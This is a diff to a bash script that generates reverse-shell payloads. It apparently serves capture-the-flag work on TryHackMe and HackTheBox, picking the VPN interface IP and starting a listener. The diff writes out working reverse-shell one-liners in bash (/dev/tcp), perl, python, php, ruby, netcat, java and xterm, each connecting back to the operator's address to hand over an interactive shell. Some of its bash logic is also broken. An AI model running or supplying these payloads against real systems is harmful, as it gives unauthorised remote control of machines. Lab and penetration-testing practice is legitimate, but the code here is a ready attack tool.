@@ -4,7 +4,29 @@
 
 
 
-error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
+error=$(cat /sys/class/net/tun0/operstate 2>/dev/null)
+e=0
+interface=0
+
+for (( i = 0; "$error" == "unknown" ; i++ )) 
+do
+  
+  error=$(cat /sys/class/net/tun$i/operstate 2>/dev/null)
+  
+  if [ "$error" != "unknown" ]
+  then
+    break
+  fi
+  e=$((e+1))
+done
+
+
+
+
+
+
+
+
 pt=1234
 x=0 
 
@@ -33,8 +55,107 @@ die() {
 	exit 1
 }
 
+setip(){
+	echo "reached setip"
+    if [ $e -gt 0 ]
+	then
+		for (( i = 0; i < $e ; i++ )); do
+			
+			ip4=$(/sbin/ip -o -4 addr list tun$i | awk '{print $4}' | cut -d/ -f1 )
+			check=$(/sbin/ip -o -4 addr list tun$i | awk '{print $4}' | cut -d/ -f1 | cut -b 1-5)
+			if [ "$check" == "10.2." ]
+			then
+				thmip=$ip4
+				
+			elif [ "$check" == "10.10" ]
+			then
+				htbip=$ip4
+				
+			else 
+				unknown$i=$ip4
+			fi
+		done
+		ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
+	else
+		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
+	fi
+}
+
+assignip(){
+	echo "reached assignip"
+
+
+
+
+
+
+if [ $e -gt 1 ] && [ "$interface" == "0" ]
+then
+	echo -e "Looks like you are connected to multiple virtual network"
+	if [ thmip ] && [ htbip ]
+		then
+			echo "Which ip you want to use"
+			echo "1. THM: $thmip"
+			echo "2. HTB: $htbip"
+
+			
+			read customip
+			if [ "$customip" == "1" ] || [ "$customip" == "THM" ] || [ "$customip" == "thm" ]
+				then
+					ip4=$thmip
+				elif [ "$customip" == "2" ] || [ "$customip" == "HTB" ] || [ "$customip" == "htb" ]
+					then
+						ip4=$htbip
+				else
+					echo "please choose from the given options"
+			fi
+
+			
+		elif [ htbip ]
+			then
+
+				echo "Using HTB IP..."
+				ip4=$htbip
+		elif [ thmip ]
+			then
+
+				echo "Using thm ip"
+				ip4=$thmip
+	fi
+elif [ "$interface" == "1" ]
+	then
+		ip4=$(/sbin/ip -o -4 addr list $inter | awk '{print $4}' | cut -d/ -f1)
+fi
+echo "fina ip assigned is $ip4"
+}
 
 assign() {
+	echo "reached assign"
+	assignip
+
+
+
+bash="bash -i >& /dev/tcp/$ip4/$pt 0>&1"
+
+perl="perl -e 'use Socket;$i=\"$ip4\";$p=$pt;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",$pt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+php="php -r '$sock=fsockopen(\"$ip4\",$pt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",$pt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+nc="nc -e /bin/sh $ip4 $pt"
+
+java="r = Runtime.getRuntime()
+p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/$pt;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
+p.waitFor() "
+
+xterm="xterm -display $ip4:1"
+
+
+
+
 if [ "$rev_shell" == "bash" ]
 then
 	rev_shell=$bash
@@ -71,7 +192,14 @@ elif [ "$rev_shell" == "xterm" ]
 	
 else
 	echo not defined
+
 fi
+echo "rev shell is: $rev_shell"
+echo "going to assignip"
+
+echo "came back to assign, now rev shell is : $rev_shell"
+
+
 echo -e "Using IP: ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
 echo -e "Using Port: ${BOLDBLUE}$pt${ENDCOLOR} \n"
 echo "Shell:"
@@ -84,12 +212,7 @@ options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n
 help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -p \t\t\t\t specify a port \n -x \t\t\t\t do not start a listener automatically \n -o \t\t\t\t show options/shells'
 
 
-    if [ "$error" == "unknown" ]
-	then
-		ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
-	else
-		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
-	fi
+
 
 if [ "$1" == "" ]
 then
@@ -160,6 +283,12 @@ while :; do
 					x=1
 
 			   ;;
+		   -i)
+				interface=1
+				inter=$2
+				
+				shift
+			   ;;
            --)              # End of all options.
                shift
                break
@@ -176,27 +305,14 @@ while :; do
 
 
 
-bash="bash -i >& /dev/tcp/$ip4/$pt 0>&1"
-
-perl="perl -e 'use Socket;$i=\"$ip4\";$p=$pt;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-
-python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",$pt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-
-php="php -r '$sock=fsockopen(\"$ip4\",$pt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-
-ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",$pt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-
-nc="nc -e /bin/sh $ip4 $pt"
-
-java="r = Runtime.getRuntime()
-p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/$pt;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
-p.waitFor() "
-
-xterm="xterm -display $ip4:1"
 
 
 if [ $sh ]
 then
+	echo "going to setip"
+	setip
+
+	echo "going to assign"
 	assign
 
 	if [ $url ]
@@ -211,7 +327,7 @@ then
 		echo "Starting a listener on port: $pt"
 		echo "---------------------------------"
 
-		if [ "$rev_shell" == "xterm -display 192.168.189.128:1" ]
+		if [ "$rev_shell" == "xterm -display $ip4:1" ]
 		then
 			Xnest :1
 		else
